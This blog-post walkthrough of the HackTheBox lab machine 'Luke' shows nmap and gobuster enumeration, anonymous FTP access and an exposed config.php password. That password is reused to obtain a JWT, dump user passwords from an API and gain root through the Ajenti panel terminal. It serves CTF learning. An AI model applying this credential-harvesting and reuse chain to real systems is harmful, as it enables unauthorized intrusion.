---
layout: post
title: Hackthebox Luke Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-09-14/luke-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of machine "Luke" on that website.<br>

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.137 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-13 20:31 EEST
Nmap scan report for 10.10.10.137
Host is up (0.035s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 523.08 seconds
{% endhighlight %}

FTP enumeration:
{% highlight shell %}
root@kali:~# ftp 10.10.10.137
Connected to 10.10.10.137.
220 vsFTPd 3.0.3+ (ext.1) ready...
Name (10.10.10.137:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
226 Directory send OK.
{% endhighlight %}

Gobuster port 80:
{% highlight shell %}
root@kali:~# gobuster dir --url http://10.10.10.137 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.137
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/09/13 20:50:17 Starting gobuster
===============================================================
/login.php (Status: 200)
/member (Status: 301)
/management (Status: 401)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/LICENSE (Status: 200)
===============================================================
2019/09/13 21:16:24 Finished
===============================================================
{% endhighlight %}

Gobuster port 3000:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.137:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.137:3000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/09/14 18:09:39 Starting gobuster
===============================================================
/login (Status: 200)
/users (Status: 200)
/Login (Status: 200)
/Users (Status: 200)
/LogIn (Status: 200)
/LOGIN (Status: 200)
===============================================================
2019/09/14 18:35:38 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

By FTP enumeration, we can find an interesting txt file.
{% highlight shell %}
ftp> pwd
257 "/webapp" is the current directory

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
226 Directory send OK.

ftp> get for_Chihiro.txt
local: for_Chihiro.txt remote: for_Chihiro.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
226 Transfer complete.
306 bytes received in 0.00 secs (2.4731 MB/s)
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat for_Chihiro.txt 
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry 
{% endhighlight %}

Next, try to enumerate HTTP.<br>
In "config.php" on port 80, we can find a credential for DB.
{% highlight shell %}
root@kali:~# curl http://10.10.10.137/config.php
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
{% endhighlight %}

Then, try to look for the place which we can use following credential.
{% highlight shell %}
root:Zk6heYCyv6ZE9Xcg
{% endhighlight %}

On port 3000, express is running and we have an API for login possibly.
{% highlight shell %}
root@kali:~# curl http://10.10.10.137:3000/Login
"please auth"
{% endhighlight %}
{% highlight shell %}
root@kali:~# curl http://10.10.10.137:3000
{"success":false,"message":"Auth token is not supplied"}
{% endhighlight %}

By googling the error message, we can immediately find following  article.<br>
<a href="https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04if4">A guide for adding JWT token-based authentication to your single page Node.js applications</a><br>
<br>
Sounds we can use the credential with following way to get a JSON token.
{% highlight shell %}
root@kali:~# curl -X POST http://10.10.10.137:3000/login -d 'username=admin&password=Zk6heYCyv6ZE9Xcg';

{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDc4MzE1LCJleHAiOjE1Njg1NjQ3MTV9.E7HA6sd-Ck86QnIQh6zLk6IaPZIuSEaunYC-mqgMcJg"}
{% endhighlight %}

We can access to other path like following.
{% highlight shell %}
root@kali:~# curl http://10.10.10.137:3000 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDc4MzE1LCJleHAiOjE1Njg1NjQ3MTV9.E7HA6sd-Ck86QnIQh6zLk6IaPZIuSEaunYC-mqgMcJg'

{"message":"Welcome admin ! "}
{% endhighlight %}

"/user" returns a list of users.
{% highlight shell %}
root@kali:~# sudo apt-get install jq
{% endhighlight %}
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.137:3000/users -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDc4MzE1LCJleHAiOjE1Njg1NjQ3MTV9.E7HA6sd-Ck86QnIQh6zLk6IaPZIuSEaunYC-mqgMcJg' | jq
[
  {
    "ID": "1",
    "name": "Admin",
    "Role": "Superuser"
  },
  {
    "ID": "2",
    "name": "Derry",
    "Role": "Web Admin"
  },
  {
    "ID": "3",
    "name": "Yuri",
    "Role": "Beta Tester"
  },
  {
    "ID": "4",
    "name": "Dory",
    "Role": "Supporter"
  }
]
{% endhighlight %}

We can put a username to the path and get additional information.
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.137:3000/users/Admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDc4MzE1LCJleHAiOjE1Njg1NjQ3MTV9.E7HA6sd-Ck86QnIQh6zLk6IaPZIuSEaunYC-mqgMcJg' | jq
{
  "name": "Admin",
  "password": "WX5b7)>/rp$U)FW"
}
{% endhighlight %}

Similary, we can achieve credential for other users.
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.137:3000/users/Derry -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDc4MzE1LCJleHAiOjE1Njg1NjQ3MTV9.E7HA6sd-Ck86QnIQh6zLk6IaPZIuSEaunYC-mqgMcJg' | jq
{
  "name": "Derry",
  "password": "rZ86wwLvx7jUxtch"
}

root@kali:~# curl -s http://10.10.10.137:3000/users/Yuri -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDc4MzE1LCJleHAiOjE1Njg1NjQ3MTV9.E7HA6sd-Ck86QnIQh6zLk6IaPZIuSEaunYC-mqgMcJg' | jq
{
  "name": "Yuri",
  "password": "bet@tester87"
}

root@kali:~# curl -s http://10.10.10.137:3000/users/Dory -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDc4MzE1LCJleHAiOjE1Njg1NjQ3MTV9.E7HA6sd-Ck86QnIQh6zLk6IaPZIuSEaunYC-mqgMcJg' | jq
{
  "name": "Dory",
  "password": "5y:!xa=ybfe)/QD"
}
{% endhighlight %}

Now we found several credentials.<br>
We have several URLs which we can try these creds on.
1. http://10.10.10.137/login.php
2. http://10.10.10.137/management (Basic AUTH)
3. http://10.10.10.137:8000 (Ajenti)
<br>
By trying creds for Derry on /management, we can go to the page which we have some sensitive files.
![placeholder](https://inar1.github.io/public/images/2019-09-14/2019-09-14-19-48-59.png)

In config.json, we can find a password for user "root".
![placeholder](https://inar1.github.io/public/images/2019-09-14/2019-09-14-21-45-58.png)

Now we got following credential.
{% highlight shell %}
root:KpMasng6S5EtTy9Z
{% endhighlight %}

We can use this cred for login to Ajenti.
![placeholder](https://inar1.github.io/public/images/2019-09-14/2019-09-14-19-53-18.png)

There is a menu "Terminal" on the bottom of side bar.<br>
Choose and click "New" button..
![placeholder](https://inar1.github.io/public/images/2019-09-14/2019-09-14-19-54-55.png)

After that, click the created terminal.<br>
Now we got a terminal for root user.<br>
As always, root.txt is in the directory for root.
![placeholder](https://inar1.github.io/public/images/2019-09-14/2019-09-14-19-57-53.png)
